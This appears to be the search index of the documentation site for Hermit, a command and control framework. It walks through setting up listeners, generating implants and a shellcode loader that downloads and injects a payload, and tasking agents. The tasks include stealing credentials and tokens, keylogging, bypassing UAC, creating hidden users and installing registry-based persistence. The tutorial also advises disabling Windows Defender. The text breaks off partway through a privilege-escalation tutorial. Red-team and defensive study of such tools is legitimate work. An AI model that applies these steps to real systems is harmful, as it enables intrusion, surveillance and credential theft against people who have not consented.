{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Home","text":""},{"location":"#hermit-c2","title":"Hermit C2","text":"<p>Hermit is a command and control framework written in Go.</p> <p></p>"},{"location":"#features","title":"Features","text":"<ul> <li>The C2 server and C2 client.</li> <li>gRPC server/client for operations.</li> <li>TLS for secure communication between the C2 server, client and agents.</li> <li>HTTPS listener.</li> <li>Multi-Staged Payload</li> <li>Data Encryption.</li> <li>Common Evasion Techniques</li> <li>Common Persistence Techniques</li> <li>Anti-Debug</li> <li>SQLite for saving data</li> </ul>"},{"location":"#warning","title":"Warning","text":"<p>This project can be used for educational purpose only. It's prohibited to use it on systems which is not under your control.</p>"},{"location":"#requirements","title":"Requirements","text":"<p>It's assumed that you operate both the C2 server and C2 client on Linux.</p> <ul> <li>Linux</li> <li>Go 1.21+</li> </ul>"},{"location":"getting-started/","title":"Getting Started","text":""},{"location":"getting-started/#1-install-hermit","title":"1. Install Hermit","text":"<p>Please see the installation page.</p>"},{"location":"getting-started/#2-start-c2-server","title":"2. Start C2 Server","text":""},{"location":"getting-started/#1-set-up-the-configuration","title":"1. Set up the Configuration","text":"<p>The <code>config.json</code> is in the project root. You can edit it for setting the bind address/port, domains, etc. Hermit automatically reads this configurations when starting the server.  </p> <p>If you're not particular about it, there's no problem leaving it as is.</p>"},{"location":"getting-started/#2-start-the-c2-server-and-console","title":"2. Start the C2 server and console","text":"<p>Simply execute the <code>hermit</code> command in the project directory where you've installed Hermit.  </p> <pre><code>./hermit\n# or\n./hermit server\n</code></pre> <p>Hermit automatically reads the <code>./config.json</code> file and setup the configuration from the file. You can also specify the config file path as below:</p> <pre><code>./hermit -c /path/to/config.json\n</code></pre> <p>Now the C2 server and console start and you can do all operations for the Hermit C2.  </p> <ul> <li>As solo, you can use it as is in this server console.  </li> <li>As team, proceed below to run the C2 client for each operator.</li> </ul>"},{"location":"getting-started/#3-transfer-the-client-config-file","title":"3. Transfer the Client Config File","text":"<p>If you would like to use Hermit as team and use C2 client, please do the follow:  </p> <ol> <li>Once the C2 server starts, the client config file is generated at <code>$HOME/.hermit/server/configs/client-config-&lt;operator&gt;.json</code>.  </li> <li>Transfer this file to the C2 client computer. </li> <li>To generate a new config file for another operator, run the <code>client-config gen</code> command on the C2 server console.</li> </ol>"},{"location":"getting-started/#3-start-c2-client","title":"3. Start C2 Client","text":""},{"location":"getting-started/#1-set-up-the-configuration_1","title":"1. Set up the Configuration","text":"<p>Before starting the C2 client, please follow the previous \"3. Transfer the Client Config File\" section.  You can edit the following config as needed:</p> <ul> <li>operator</li> </ul>"},{"location":"getting-started/#2-start-the-c2-client","title":"2. Start the C2 client","text":"<p>Simply run the following command with specifying the <code>client-config-&lt;operator&gt;.json</code>.</p> <pre><code>./hermit-client -c /path/to/client-config-&lt;operator&gt;.json\n</code></pre>"},{"location":"getting-started/#4-more-deeper","title":"4. More Deeper...","text":"<p>Please see the Tutorial: Simple Implant Beacon.</p>"},{"location":"installation/","title":"Installation","text":""},{"location":"installation/#clone-the-repo","title":"Clone the Repo","text":"<p>First, clone the repository and get into the project directory.</p> <pre><code>git clone https://github.com/hideckies/hermit.git\ncd hermit\n</code></pre>"},{"location":"installation/#install-c2-server","title":"Install C2 Server","text":"<p>To install Hermit as C2 server, run <code>make server</code>.</p> <pre><code>make server\n./hermit -h\n</code></pre>"},{"location":"installation/#install-c2-client","title":"Install C2 Client","text":"<p>To install Hermit as C2 client, run <code>make client</code>.</p> <pre><code>make client\n./hermit-client -h\n</code></pre>"},{"location":"guides/agent-mode/","title":"Agent Mode","text":"<p>We can switch to the agent mode with <code>agent use &lt;agent-id&gt;</code> command in the C2 server console. This feature can be used after C2 agents connected to listeners.</p> <p>Once the agent mode activated, our prompt looks like below:</p> <pre><code>Hermit [agent-abcd] &gt;\n</code></pre> <p>As seen above, <code>[agent-abcd]</code> string is added.  </p>"},{"location":"guides/agent-mode/#what-difference-between-normal-mode-and-agent-mode","title":"What Difference Between Normal Mode and Agent Mode?","text":"<p>In Agent mode, we can use most of the commands found in Normal mode, as well as send tasks to C2 agents and see loot that gained by task results.  </p> <p>To see all commands available, run <code>?</code>, <code>help</code> or <code>help &lt;command&gt;</code>.</p>"},{"location":"guides/agent/","title":"Agent","text":"<p>The <code>agent</code> command manages C2 agents. Basically, this command is used after the C2 agent connected to listeners.  </p> <p>For usage, run <code>help agent</code>, <code>help agent &lt;subcommand&gt;</code>.</p>"},{"location":"guides/agent/#agent-list-agents","title":"<code>agent list</code>, <code>agents</code>","text":"<p>List agents connected to our listeners.</p>"},{"location":"guides/agent/#agent-info-id","title":"<code>agent info &lt;ID&gt;</code>","text":"<p>Prints the agent detailed information.</p>"},{"location":"guides/agent/#agent-note-id","title":"<code>agent note &lt;ID&gt;</code>","text":"<p>Takes a note for the agent. This is useful when we want to write down arbitrary information. It spawns <code>nano</code> editor by default. If error occured, tries <code>vim</code>.</p>"},{"location":"guides/agent/#agent-delete-id","title":"<code>agent delete &lt;ID&gt;</code>","text":"<p>Deletes an agent.</p>"},{"location":"guides/configuration/","title":"Configuration","text":"<p>We can edit <code>config.json</code> in the Hermit project root for custom server settings.</p>"},{"location":"guides/configuration/#host","title":"host","text":"<p>The C2 server's bind address. In most cases, it's no problem that it's <code>0.0.0.0</code>.</p>"},{"location":"guides/configuration/#port","title":"port","text":"<p>The C2 server's bind port. It's set <code>9999</code> by default.</p>"},{"location":"guides/configuration/#domains","title":"domains","text":"<p>The C2 server's domains. The domains set here are reflected as SANS of certificates.</p>"},{"location":"guides/configuration/#listenersfakeroutes","title":"listeners.fakeRoutes","text":"<p>We can spoof the paths where the C2 agent sends requests to the listener. Please make sure that the path names are unique, otherwise unexpected behaviour will occur.</p>"},{"location":"guides/listener/","title":"Listener","text":"<p>The <code>listener</code> command manages for the listener create/start/stop/delete.  </p> <p>For usage, run <code>help listener</code>, <code>help listener &lt;subcommand&gt;</code>.</p>"},{"location":"guides/listener/#listener-new","title":"<code>listener new</code>","text":"<p>Creates a new listener and start it. If we simply run the <code>lisetner new</code> command without flags, the address is set from the network interface (<code>eth0</code> or <code>ens33</code>) and the port is generated randomly between <code>49152</code> and <code>65535</code>. And domains are set from <code>config.json</code> setting.</p>"},{"location":"guides/listener/#custom-url-domains","title":"Custom URL &amp; Domains","text":"<p>We can specify the custom URL and domains (separate with <code>,</code> for multiple domains).</p> Hermit C2 Server Console<pre><code>Hermit &gt; listener new -u https://172.12.34.56:4443 --d hermit.evil,hacker.tokyo\n</code></pre>"},{"location":"guides/listener/#listener-start-id","title":"<code>listener start &lt;ID&gt;</code>","text":"<p>Starts a specified listener by ID.  </p>"},{"location":"guides/listener/#listener-stop-id","title":"<code>listener stop &lt;ID&gt;</code>","text":"<p>Stops a specified listener by ID.</p>"},{"location":"guides/listener/#listener-delete-id","title":"<code>listener delete &lt;ID&gt;</code>","text":"<p>Deletes a specified listener by ID.</p>"},{"location":"guides/listener/#listener-list-listeners","title":"<code>listener list</code>, <code>listeners</code>","text":"<p>Lists all listeners available.</p>"},{"location":"guides/listener/#listener-info-id","title":"<code>listener info &lt;ID&gt;</code>","text":"<p>Prints a listener detailed information.</p>"},{"location":"guides/listener/#listener-payloads-id","title":"<code>listener payloads &lt;ID&gt;</code>","text":"<p>Lists and manages payloads hosted on a specified listener by ID. On the select menu after run this command, we can select the payload and delete it.</p>"},{"location":"guides/payload/","title":"Payload","text":"<p>The <code>payload</code> command generates a new payload such as implant, loader, shellcode.</p>"},{"location":"guides/payload/#payload-gen","title":"<code>payload gen</code>","text":"<p>Generates a new payload. After running this command, the settings wizard will start and we can follow the instructions easily.  </p>"},{"location":"guides/reset/","title":"Reset Hermit","text":"<p>If we want to reset the Hermit project, simply delete the <code>$HOME/.hermit</code> folder, or run the following command on the Hermit project root:</p> <pre><code>make clean\n</code></pre> <p>This is all you need to do for making your Hermit project to be initial state.</p>"},{"location":"guides/task/","title":"Task","text":"<p>After C2 agents connected to listeners, we can send various tasks in Agent Mode. Before sending tasks, we need to switch to Agent Mode at first.</p> <p>Currently, the following tasks are available:</p> <pre><code>TASK:\n  assembly        Load and execute .NET assembly.\n  cat             Read contents of a file.\n  cd              Change the working directory.\n  cmd             Execute arbitrary system command.\n  connect         Change listener URL to connect.\n  cp              Copy a file.\n  creds steal     Steal credentials from various resources on the target computer\n  dll             Load DLL and inject modules into the specified process.\n  download        Download a file.\n  env ls          List environment variables.\n  envs            alias for 'env ls'\n  find            Find files.\n  group ls        List local groups.\n  groups          Alias for 'group ls'.\n  history         Retrieve information from history files of applications\n  ip              Print the network interface information on target computer\n  jitter          Set jitter time (seconds) between requests from beacon\n  keylog          Keylogging N seconds.\n  kill            Terminate the current process.\n  killdate        Change killdate (UTC) for the implant beacon.\n  ls              List files in a directory.\n  migrate         Migrate the implant into another process.\n  mkdir           Create a new directory.\n  mv              Move a file to a destination location.\n  net             Get TCP connections.\n  pe              Load and execute PE (Portable Executable) file.\n  persist         Establish persistence for implant.\n  procdump        Dump process memory to a specified output file.\n  ps kill         Terminate a process.\n  ps ls           List processes.\n  pwd             Print the current working directory.\n  reg query       Enumerate subkeys for the specified path.\n  rm              Remove file or directory.\n  rportfwd add    Add settings to reverse port forwarding.\n  rportfwd ls     List settings for reverse port forwarding.\n  rportfwd rm     Stop and remove listener for reverse port forwarding.\n  runas           Execute a program as another user.\n  screenshot      Take a screenshot on target computer.\n  shellcode       Inject shellcode into the specified process.\n  sleep           Set sleep time (seconds) between requests from beacon.\n  sysinfo         Regrieve system information of target computer.\n  token revert    Revert back to the original process token.\n  token steal     Steal token from the specified process and impersonate process.\n  uac             Bypass UAC and start another session.\n  upload          Upload a file to the target computer.\n  user add        Add new user.\n  user ls         List users.\n  user rm         Delete user account.\n  users           Alias for 'user ls'.\n  whoami          Print the current user information.\n</code></pre> <p>Most task commands are similar to system commands. For each usage, run <code>help &lt;command&gt;</code> or <code>help &lt;command&gt; &lt;subcommand&gt;</code> on Agent mode.</p>"},{"location":"guides/task/#cat","title":"<code>cat</code>","text":"<p>Prints contents of a file.</p> <pre><code>Hermit [agent-abcd] &gt; cat example.txt\n</code></pre>"},{"location":"guides/task/#cd","title":"<code>cd</code>","text":"<p>Changes current working directory. Please note that if you want to use a backslash (<code>\\</code>) in the desination path, you need to add another backslash (<code>\\\\</code>) as below:</p> <pre><code>Hermit [agent-abcd] &gt; cd \"C:\\\\Program Files\\\\\"\n</code></pre> <p>Or you can use a normal slash (<code>/</code>) instead of a backslash:</p> <pre><code>Hermit [agent-abcd] &gt; cd \"C:/Program Files/\"\n</code></pre>"},{"location":"guides/task/#cmd","title":"<code>cmd</code>","text":"<p>Executes an arbitrary system command.</p> <pre><code>Hermit [agent-abcd] &gt; cmd \"dir -Force\"\n</code></pre>"},{"location":"guides/task/#connect","title":"<code>connect</code>","text":"<p>Changes the connected listener URL to new one.  This is used when we want to change to another listener for communication.</p> <pre><code>Hermit [agent-abcd] &gt; connect https://172.12.34.56:12345\n</code></pre>"},{"location":"guides/task/#cp","title":"<code>cp</code>","text":"<p>Copies a file to destination path on a victim machine. We can specify an absolute path or a relative path.</p> <pre><code>Hermit [agent-abcd] &gt; cp /tmp/example.txt ./example.txt\n</code></pre>"},{"location":"guides/task/#dll","title":"<code>dll</code>","text":"<p>Injects DLL into specified process.</p> <pre><code># -p: target process ID\n# -f: a DLL file path\nHermit [agent-abcd] &gt; dll -p 1234 -f /path/to/example.dll\n</code></pre> <p>To see running processes and check PIDs, use <code>ps ls</code> task.  </p>"},{"location":"guides/task/#download","title":"<code>download</code>","text":"<p>Downloads a file from victim machine.</p> <pre><code>Hermit [agent-abcd] &gt; download C:/Users/John/Desktop/example.txt /tmp/example.txt\n</code></pre>"},{"location":"guides/task/#env","title":"<code>env</code>","text":""},{"location":"guides/task/#env-ls-envs","title":"<code>env ls</code>, <code>envs</code>","text":"<p>Lists environment variables in victim machine.</p>"},{"location":"guides/task/#find","title":"<code>find</code>","text":"<p>Find files or directories that contain the specified strings.</p> <pre><code># -n: Specified strings\nHermit [agent-abcd] &gt; find -n \"creds.txt\" ./\n</code></pre>"},{"location":"guides/task/#group","title":"<code>group</code>","text":""},{"location":"guides/task/#group-ls-groups","title":"<code>group ls</code>, <code>groups</code>","text":"<p>Lists local groups in victim machine.</p>"},{"location":"guides/task/#jitter","title":"<code>jitter</code>","text":"<p>Changes the Jitter time (N seconds).</p> <pre><code>Hermit [agent-abcd] &gt; jitter 10\n</code></pre>"},{"location":"guides/task/#keylog","title":"<code>keylog</code>","text":"<p>Runs keylogger for N seconds.</p> <pre><code># Keylogging for one minute.\nHermit [agent-abcd] &gt; keylog 60\n</code></pre>"},{"location":"guides/task/#kill","title":"<code>kill</code>","text":"<p>Terminates the implant process. After running this task, the connection with the C2 agent will be terminated.</p>"},{"location":"guides/task/#killdate","title":"<code>killdate</code>","text":"<p>Changes the KillDate datetime. Specify in UTC. And the format is such like <code>2025-01-01 00:00:00</code>.</p> <pre><code>Hermit [agent-abcd] &gt; killdate 2025-01-01 06:01:20\n</code></pre>"},{"location":"guides/task/#ls","title":"<code>ls</code>","text":"<p>Lists files in current working directory in victim machine.</p>"},{"location":"guides/task/#migrate","title":"<code>migrate</code>","text":"<p>Migrates the implant to another process. Specify the target process ID (PID).</p> <pre><code>Hermit [agent-abcd] &gt; migrate 1234\n</code></pre> <p>To see running processes and PIDs, use <code>ps ls</code> task.</p>"},{"location":"guides/task/#mkdir","title":"<code>mkdir</code>","text":"<p>Creates a new directory in current working directory in victim machine.</p> <pre><code>Hermit [agent-abcd] &gt; mkdir new_dir\n</code></pre>"},{"location":"guides/task/#mv","title":"<code>mv</code>","text":"<p>Move a file to specified place.</p> <pre><code>Hermit [agent-abcd] &gt; mv ./example.txt C:/Users/John/Documents/example.txt\n</code></pre>"},{"location":"guides/task/#net","title":"<code>net</code>","text":"<p>Prints open ip/ports.</p>"},{"location":"guides/task/#pe","title":"<code>pe</code>","text":"<p>Loads and executes a Portable Executable (<code>.exe</code>) file.</p> <pre><code># -f: an executable file path\nHermit [agent-abcd] &gt; pe -f /path/to/example.exe\n</code></pre>"},{"location":"guides/task/#persist","title":"<code>persist</code>","text":"<p>Make the implant persistence.  </p> <pre><code>Hermit [agent-abcd] &gt; persist\n</code></pre> <p>We can select the persistence technique in wizard.  </p>"},{"location":"guides/task/#technique-1-runkey","title":"Technique 1: <code>runkey</code>","text":"<p>Add an entry (the implant path) to <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>. The implant will run every time the victim machine starts.  </p> <p>Cleanup:</p> Windows Victim Machine<pre><code>Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"RandomName\"\n</code></pre> <p>Replace the <code>RandomName</code> with the actual name which is randomly generated strings. To see the name, check with Registry Editor (regedit).</p>"},{"location":"guides/task/#technique-2-user-init-mpr-logon-script","title":"Technique 2: <code>user-init-mpr-logon-script</code>","text":"<p>Uses <code>UserInitMprLogonScript</code>. Add an entry (the imaplant path) to <code>HKCU\\Environment</code>. The implant will run every time a user logs in.</p> <p>Cleanup:</p> Windows Victim Machine<pre><code>Remove-ItemProperty -Path \"HKCU:\\Environment\" -Name \"UserInitMprLogonScript\"\n</code></pre>"},{"location":"guides/task/#technique-3-default-file-extension-hijacking","title":"Technique 3: <code>default-file-extension-hijacking</code>","text":"<p>Update an entry for <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command</code>. Overwrite the default application when clicking a <code>.txt</code> file. It's required to Administrator privilege.  </p> <p>Cleanup:</p> Windows Victim Machine<pre><code>reg add \"HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command\" /ve /t REG_EXPAND_SZ /d \"%SystemRoot%\\system32\\NOTEPAD.EXE %1\"\n</code></pre>"},{"location":"guides/task/#technique-4-screensaver","title":"Technique 4: <code>screensaver</code>","text":"<p>Add an entry (the implant path) to <code>HKCU\\Control Panel\\Desktop</code>. The implant will run after a period of user inactivity.  </p> <p>Cleanup:</p> Windows Victim Machine<pre><code>Remove-ItemProperty -Path \"HKCU:\\Control Panel\\Desktop\" -Name 'ScreenSaveTimeOut'\nRemove-ItemProperty -Path \"HKCU:\\Control Panel\\Desktop\" -Name 'SCRNSAVE.EXE'\n</code></pre>"},{"location":"guides/task/#technique-5-ifeo-required-administrator-privilege","title":"Technique 5: <code>ifeo</code> (Required: Administrator privilege)","text":"<p>Uses Image File Execution Options. Write entries for <code>HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe</code> and <code>HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe</code>.  </p> <p>Cleanup:</p> Windows Victim Machine<pre><code>Remove-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\" -Name 'GlobalFlag'\nRemove-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\" -Name 'ReportingMode'\nRemove-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\" -Name 'MonitorProcess'\n</code></pre>"},{"location":"guides/task/#technique-6-scheduled-task-required-administrator-privilege","title":"Technique 6: <code>scheduled-task</code> (Required: Administrator privilege)","text":"<p>Adds the implant path to the Scheduled Task.</p> <p>Cleanup:</p> Windows Victim Machine<pre><code>schtasks /delete /tn \"TaskName\" /f\n# or\nreg delete \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\&lt;TASK-GUID&gt;\" /f\nreg delete \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\&lt;TaskName&gt;\" /f\n</code></pre>"},{"location":"guides/task/#technique-7-ghosttask-required-system-privilege","title":"Technique 7: <code>ghosttask</code> (Required: SYSTEM privilege)","text":"<p>Work in progress.</p>"},{"location":"guides/task/#technique-8-startup-folder","title":"Technique 8: <code>startup-folder</code>","text":"<p>Copies the implant to the Startup folder (<code>%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>).</p>"},{"location":"guides/task/#technique-9-winlogon-required-administrator-privilege","title":"Technique 9: <code>winlogon</code> (Required: Administrator privilege)","text":"<p>Add an entry (the implant path) to <code>HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon</code>. The implant will run every time a user logs on.  </p> <p>Cleanup:</p> Windows Victim Machine<pre><code>reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v \"Shell\" /t REG_SZ /d \"explorer.exe\" /f\n</code></pre>"},{"location":"guides/task/#procdump","title":"<code>procdump</code>","text":"<p>Dump process memory and save it to dump file. Specify a target process ID (PID).</p> <pre><code>Hermit [agent-abcd] &gt; procdump 1234\n</code></pre> <p>After dumping, the dump file is saved under <code>$HOME/.hermit/server/agents/agent-&lt;name&gt;/loot/procdumps</code> folder. To see running processes and PIDs, use <code>ps ls</code> task.</p>"},{"location":"guides/task/#ps","title":"<code>ps</code>","text":"<p>Manages processes.</p>"},{"location":"guides/task/#ps-kill","title":"<code>ps kill</code>","text":"<p>Terminates a specified process.</p> <pre><code>Hermit [agent-abcd] &gt; ps kill 1234\n</code></pre>"},{"location":"guides/task/#ps-ls","title":"<code>ps ls</code>","text":"<p>Lists all running processes.</p>"},{"location":"guides/task/#pwd","title":"<code>pwd</code>","text":"<p>Prints the current working directory.</p>"},{"location":"guides/task/#reg","title":"<code>reg</code>","text":"<p>Manages registy keys.</p>"},{"location":"guides/task/#reg-query","title":"<code>reg query</code>","text":"<p>Retrieve registry values. For recursively, add <code>-r</code> flag.</p> <pre><code>Hermit [agent-abcd] &gt; reg query \"HKLM\\\\SOFTWARE\\\\Microsoft\" -r\n</code></pre>"},{"location":"guides/task/#rm","title":"<code>rm</code>","text":"<p>Removes file or directory.</p> <pre><code>Hermit [agent-abcd] &gt; rm example.txt\n</code></pre> <p>To remove a directory recursively, add <code>-r</code> flag.</p> <pre><code>Hermit [agent-abcd] &gt; rm -r example_dir\n</code></pre>"},{"location":"guides/task/#rportfwd","title":"<code>rportfwd</code>","text":"<p>Under development.</p>"},{"location":"guides/task/#runas","title":"<code>runas</code>","text":"<p>Runs a command as another user.</p> <pre><code>Hermit [agent-abcd] &gt; runas -u Administrator -p 'Password123' notepad.exe\n</code></pre>"},{"location":"guides/task/#screenshot","title":"<code>screenshot</code>","text":"<p>Takes a screenshot and save it as PNG file.</p> <pre><code>Hermit [agent-abcd] &gt; screenshot\n</code></pre> <p>After successful, the captured image file is saved under <code>$HOME/.hermit/server/agents/agent-&lt;name&gt;/loot/screenshots</code> folder.</p>"},{"location":"guides/task/#shellcode","title":"<code>shellcode</code>","text":"<p>Injects shellcode to specified process.</p> <pre><code># -p: target process ID\n# -f: a shellcode file path\nHermit [agent-abcd] &gt; shellcode -p 1234 -f /path/to/shellcode.bin\n</code></pre> <p>To see running processes and PIDs, use <code>ps ls</code> task.</p>"},{"location":"guides/task/#sleep","title":"<code>sleep</code>","text":"<p>Changes the Sleep time (N seconds).</p> <pre><code>Hermit [agent-abcd] &gt; sleep 10\n</code></pre>"},{"location":"guides/task/#sysinfo","title":"<code>sysinfo</code>","text":"<p>Retrieves the system information on a target machine.</p> <pre><code>Hermit [agent-abcd] &gt; sysinfo\n</code></pre>"},{"location":"guides/task/#token","title":"<code>token</code>","text":"<p>Manages token.</p>"},{"location":"guides/task/#token-revert","title":"<code>token revert</code>","text":"<p>Reverts back to the original process token.</p>"},{"location":"guides/task/#token-steal","title":"<code>token steal</code>","text":"<p>Steal token from a specified process and impersonate. Please specify either <code>--process</code> or <code>--login</code> flag.</p> <pre><code># --process: Execute process with stolen token.\nHermit [agent-abcd] &gt; token steal --pid 1234 --process notepad.exe\n\n# --login: Impersonate logged on.\nHermit [agent-abcd] &gt; token steal --pid 1234 --login\n</code></pre>"},{"location":"guides/task/#upload","title":"<code>upload</code>","text":"<p>Upload a file to victim machine.</p> <pre><code>Hermit [agent-abcd] &gt; upload /tmp/example.txt C:/Users/John/Desktop/example.txt\n</code></pre>"},{"location":"guides/task/#user","title":"<code>user</code>","text":"<p>Manages users.</p>"},{"location":"guides/task/#user-add","title":"<code>user add</code>","text":"<p>Add new user account.</p> <pre><code>Hermit [agent-abcd] &gt; user add -u \"John\" -p \"Password@123\"\n</code></pre> <p>To hide a new user from <code>net user</code> command, add prefix <code>$</code> to the username as below:</p> <pre><code>Hermit [agent-abcd] &gt; user add -u \"John$\" -p \"Password@123\"\n</code></pre>"},{"location":"guides/task/#user-ls-users","title":"<code>user ls</code>, <code>users</code>","text":"<p>Lists local users.</p>"},{"location":"guides/task/#user-rm","title":"<code>user rm</code>","text":"<p>Delete a specified user.</p> <pre><code>Hermit [agent-abcd] &gt; user rm -u \"John\"\n</code></pre>"},{"location":"guides/task/#whoami","title":"<code>whoami</code>","text":"<p>Prints current user information on victim machine.  </p> <pre><code>Hermit [agent-abcd] &gt; whoami\n</code></pre> <p>To print the privileges, add <code>--priv</code> flag.</p> <pre><code>Hermit [agent-abcd] &gt; whoami --priv\n</code></pre>"},{"location":"tutorials/load-and-execute-shellcode-implant/","title":"Load &amp; Execute Shellcode Implant","text":"<p>This tutorial explains about generating a shellcode implant and load/inject it with a shellcode loader. Hermit can do that easily because it has features to generate sRDI shellcode.  </p> <p>Before starting, we assume that you've already done the tutorial: Simple Implant Beacon. If not yet, please complete it first.</p> <p>IMPORTANT: It's heavily recommended to use a virtual machine for Windows victim machine because If we modify the registry etc., the system might not work properly. Also we recommend temporarily turning off real-time protection of Windows Defender as it is likely to be detected by Windows Defender.</p>"},{"location":"tutorials/load-and-execute-shellcode-implant/#1-start-c2-server-start-listener","title":"1. Start C2 Server &amp; Start Listener","text":"<p>Maybe we're familiar with these steps already, so proceed easily.</p> <pre><code># 1. Start C2 server\n./hermit\n\n# 2. Start new listener\nHermit &gt; listener new\n</code></pre>"},{"location":"tutorials/load-and-execute-shellcode-implant/#2-generate-srdi-shellcode","title":"2. Generate sRDI Shellcode","text":"<p>sRDI (Shellcode Reflective DLL Injection) is a technique that converts DLL to position independent shellcode. Please see the original implementation for details. This allows us to generate a shellcode implant with just a few step. Hermit makes that even easier, so just run <code>payload gen</code> command as below image:  </p> <p></p> <p>In the wizard as image above, choose the following:</p> <pre><code>1. What to generate?        -&gt; implant\n2. Implant type             -&gt; beacon\n3. OS/Arch/Format           -&gt; windows/amd64/bin\n4. Listener URL to Connect  -&gt; the listener URL that is created &amp; started in the previous section\n</code></pre> <p>The rest is optional.  </p> <p>IMPORTANT: Please note that we need to choose <code>windows/amd64/bin</code> for <code>OS/Arch/Format</code> to generate a shellcode.</p> <p>After that, the generated implant is saved under <code>$HOME/.hermit/server/listeners/https-&lt;listener_name&gt;/payloads/</code>.  </p> <p>IMPORTANT: Do not move this file because a loader can automatically find and download an implant in the corresponding listener's folder. </p>"},{"location":"tutorials/load-and-execute-shellcode-implant/#3-generate-shellcode-loader","title":"3. Generate Shellcode Loader","text":"<p>Next, we generate a shellcode loader that downloads the generated shellcode implant from a listener and execute it in the victim machine. To do so, run <code>payload gen</code> command again as below image:</p> <p></p> <p>In the wizard as image above, choose the following:</p> <pre><code>1. What to generate?                -&gt; loader\n2. Loader type                      -&gt; shellcode-loader\n3. OS/Arch/Format                   -&gt; windows/amd64/exe\n4. Listener URL to Connect          -&gt; the same URL which is choosed in the previous 'payload gen' section.\n5. Injection Technique              -&gt; shellcode-injection (here select the most basic technique for tutorial...)\n6. Target Process to be Injected    -&gt; empty ('notepad.exe' by default)\n</code></pre> <p>After that, the generated loader is saved under <code>$HOME/.hermit/server/listeners/https-&lt;listener_name&gt;/payloads/</code> just like with the implant.  </p> <p>Now transfer this file to Windows victim machine. </p>"},{"location":"tutorials/load-and-execute-shellcode-implant/#4-execute-shellcode-loader","title":"4. Execute Shellcode Loader","text":""},{"location":"tutorials/load-and-execute-shellcode-implant/#start-target-process","title":"Start Target Process","text":"<p>In the Windows victim machine, we need to open <code>Notepad</code> at first because we inject a shellcode implant to a specified process (we've chosen <code>notepad.exe</code> in the previouse section).  </p> Windows Victim Machine<pre><code>notepad.exe\n</code></pre>"},{"location":"tutorials/load-and-execute-shellcode-implant/#execute-loader","title":"Execute Loader","text":"<p>Then execute the loader which was transfered in the previous section.</p> Windows Victim Machine<pre><code># Replace the filename with your own.\n.\\shellcode-loader.exe\n</code></pre> <p>Now the loader will download our shellcode and inject it into the <code>Notepad</code> process. After a few seconds, see the agent has been checked-in with <code>agents</code> command in the Hermit console:</p> Hermit C2 Server Console<pre><code>Hermit &gt; agents\n[+]\nID  Name         IP           OS/Arch        Hostname  ListenerURL                 ImplantType  CheckIn              SessionID\n1   agent-bruce  172.20.32.1  windows/amd64  machine   https://example.evil:65372  beacon       2024-05-30 09:13:38  Zy8ZPj1P0tFw58Bwv8XGZpzfuhZ2Z5P1\n</code></pre> <p>We could inject a shellcode implant into the target process successfully.  </p>"},{"location":"tutorials/load-and-execute-shellcode-implant/#5-mission-complete","title":"5. Mission Complete!","text":"<p>Congratulations! Now we can do something with a shellcode implant.  </p>"},{"location":"tutorials/load-and-execute-shellcode-implant/#6-try-tasks","title":"6. Try Tasks...","text":"<p>Okay, the purpose of this tutorial has been achieved so we can finish here, but it's a little boring, so let's play around with a few tasks! First of all, enter the agent mode:</p> Hermit C2 Server Console<pre><code>Hermit &gt; agent use 1\n[+] Switched to agent mode.\nHermit [agent-bruce] &gt; \n</code></pre>"},{"location":"tutorials/load-and-execute-shellcode-implant/#task-pwd","title":"Task: <code>pwd</code>","text":"<p>To print current working directory path, run the following task:</p> Hermit C2 Server Console<pre><code>Hermit [agent-bruce] &gt; pwd\n</code></pre> <p>Then after a few seconds, check the result with <code>loot show</code> command.  </p>"},{"location":"tutorials/load-and-execute-shellcode-implant/#task-ls","title":"Task: <code>ls</code>","text":"<p>To print files in the current directory, run the following task:</p> Hermit C2 Server Console<pre><code>Hermit [agent-bruce] &gt; ls\n</code></pre>"},{"location":"tutorials/load-and-execute-shellcode-implant/#task-cat","title":"Task: <code>cat</code>","text":"<p>To print a specified file contents, run the following task:</p> Hermit C2 Server Console<pre><code>Hermit [agent-bruce] &gt; cat example.txt\n</code></pre>"},{"location":"tutorials/load-and-execute-shellcode-implant/#7-stop-implant","title":"7. Stop Implant","text":"<p>As explained in other tutorials, run the <code>kill</code> task to terminate the implant.  </p>"},{"location":"tutorials/privilege-escalation-with-implant-beacon/","title":"Privilege Escalation with Implant Beacon","text":"<p>In this tutorial, we're going to  escalate privilege to System user with implant beacon on Windows victim machine.  </p> <p>Assume that you've already done the Tutorial: Simple Implant Beacon.  </p>"},{"location":"tutorials/privilege-escalation-with-implant-beacon/#1-start-implant-activate-agent-mode","title":"1. Start Implant &amp; Activate Agent Mode","text":"<p>Because we've already learned the basic operation for an implant in the previous tutorial, we proceed as follows without detailed explanations:</p> Hermit C2 Server Console<pre><code># 1. Start Hermit server.\n./hermit\n\n# 2. Start listener.\nHermit &gt; listener new\n\n# 3. Generate an implant (beacon, windows/amd64/exe).\nHermit &gt; payload gen\n\n# 4. Transfer the implant to Windows victim machine and execute it as normal user (not administrator or system user).\n\n# Wait until the agent callbacks...\n\n# 5. Activate the Agent Mode.\nHermit &gt; agent use 1\nHermit [agent-stephan] &gt;\n</code></pre> <p>Now we can send tasks to the agent and get result callbacks.</p>"},{"location":"tutorials/privilege-escalation-with-implant-beacon/#2-check-the-current-privileges","title":"2. Check the 